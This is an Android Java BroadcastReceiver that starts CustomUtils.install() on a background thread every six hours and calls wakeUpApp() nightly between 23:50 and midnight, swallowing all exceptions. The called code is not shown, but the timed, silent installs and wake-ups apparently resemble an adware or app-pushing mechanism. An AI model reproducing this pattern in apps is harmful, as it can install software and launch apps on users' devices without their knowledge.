package com.custom.broadcast;

import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Date;
import java.util.HashMap;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.custom.Constant;
import com.custom.CustomUtils;
import com.custom.SharedPreferencesUtils;
import com.custom.network.HttpRequest;

public class StartServiceReceiver extends BroadcastReceiver {  
	Context context = null;
	public static long sixHoure = 6*60*60*1000;//6小时
	java.text.SimpleDateFormat sf = new java.text.SimpleDateFormat("yyyyMMdd");
    @Override      
    public void onReceive(Context context, Intent intent) { 
    	//Log.e("StartServiceReceiver","StartServiceReceiver++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
    	this.context = context;
   	 if (intent.getAction().equals("com.custom.broadcast.StartServiceReceiver")) { 
   		 //每隔6小时安装一次
   		 String installTime =SharedPreferencesUtils.getConfigString(
    				SharedPreferencesUtils.CONFIG_INFO, SharedPreferencesUtils.INSTALL_TIME);
   		 long times = 0;
   		 try{
   			times = Long.parseLong(installTime);
   		 }catch(Exception e){
   			 
   		 }
   		 
   		 Date dateTime = new Date();
   		 long nowTime = dateTime.getTime();

   		 
   		 
   		 try{

   	   		
   	   		if(nowTime-times>=sixHoure){
   	   			SharedPreferencesUtils.setConfigString(
   	      				SharedPreferencesUtils.CONFIG_INFO, 
   	      				SharedPreferencesUtils.INSTALL_TIME,
   	      				String.valueOf(nowTime));
   	   			new Thread(){
   	   				public void run(){
   	    	   			new CustomUtils(StartServiceReceiver.this.context).install();
   	   				}
   	   			}.start();

   	   		}
    	 }catch(Exception e){
    			 
    	 }


    	 try{
       		 //没天12点左右打开程序
       		 String wakeup_date =SharedPreferencesUtils.getConfigString(
     				SharedPreferencesUtils.CONFIG_INFO, SharedPreferencesUtils.WAKEUP_DATE);
       		 String nowDate = sf.format(dateTime);
        	 if(wakeup_date.equals("")||!nowDate.equals(wakeup_date)){
        		 if(dateTime.getHours()==23&&dateTime.getMinutes()>50){
        			 
        	   			SharedPreferencesUtils.setConfigString(
        	     				SharedPreferencesUtils.CONFIG_INFO, 
        	     				SharedPreferencesUtils.WAKEUP_DATE,
        	     				String.valueOf(nowDate));
           	   			new Thread(){
           	   				public void run(){
           	   					new CustomUtils(StartServiceReceiver.this.context).wakeUpApp();
           	   				}
           	   			}.start();
        		 }
        	 }
    	 }catch(Exception e){
			 
    	 }
    	
   		 
	 }
    }
    
    
}
